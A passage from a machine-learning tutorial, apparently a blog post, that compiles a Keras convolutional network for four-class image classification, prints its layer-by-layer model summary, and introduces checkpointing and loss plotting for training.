…
    decay_rate=0.96,
    staircase=True)

optimizer = Adam(learning_rate=lr_schedule)</pre>
<p>So, Let’s compile the model now and check its summary.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model.compile(optimizer=optimizer, loss='categorical_crossentropy', metrics=['accuracy'])
model.summary()</pre>
<p>Output:</p>
<pre>Model: "sequential"
_________________________________________________________________
Layer (type)                 Output Shape              Param #   
=================================================================
conv2d (Conv2D)              (None, 64, 128, 32)       832       
_________________________________________________________________
batch_normalization (BatchNo (None, 64, 128, 32)       128       
_________________________________________________________________
activation (Activation)      (None, 64, 128, 32)       0         
_________________________________________________________________
max_pooling2d (MaxPooling2D) (None, 32, 64, 32)        0         
_________________________________________________________________
dropout (Dropout)            (None, 32, 64, 32)        0         
_________________________________________________________________
conv2d_1 (Conv2D)            (None, 32, 64, 64)        51264     
_________________________________________________________________
batch_normalization_1 (Batch (None, 32, 64, 64)        256       
_________________________________________________________________
activation_1 (Activation)    (None, 32, 64, 64)        0         
_________________________________________________________________
max_pooling2d_1 (MaxPooling2 (None, 16, 32, 64)        0         
_________________________________________________________________
dropout_1 (Dropout)          (None, 16, 32, 64)        0         
_________________________________________________________________
flatten (Flatten)            (None, 32768)             0         
_________________________________________________________________
dense (Dense)                (None, 1024)              33555456  
_________________________________________________________________
batch_normalization_2 (Batch (None, 1024)              4096      
_________________________________________________________________
activation_2 (Activation)    (None, 1024)              0         
_________________________________________________________________
dropout_2 (Dropout)          (None, 1024)              0         
_________________________________________________________________
dense_1 (Dense)              (None, 4)                 4100      
=================================================================
Total params: 33,616,132
Trainable params: 33,613,892
Non-trainable params: 2,240
_________________________________________________________________</pre>
<h2>Model Training</h2>
<p>Before we start training the model, first we will do the checkpointing and save the weights for which the validation loss is minimum and accuracy is best. Then, using PlotLossesCallback function we will graphically show the loss and the accuracy after each epoch.</p>
…
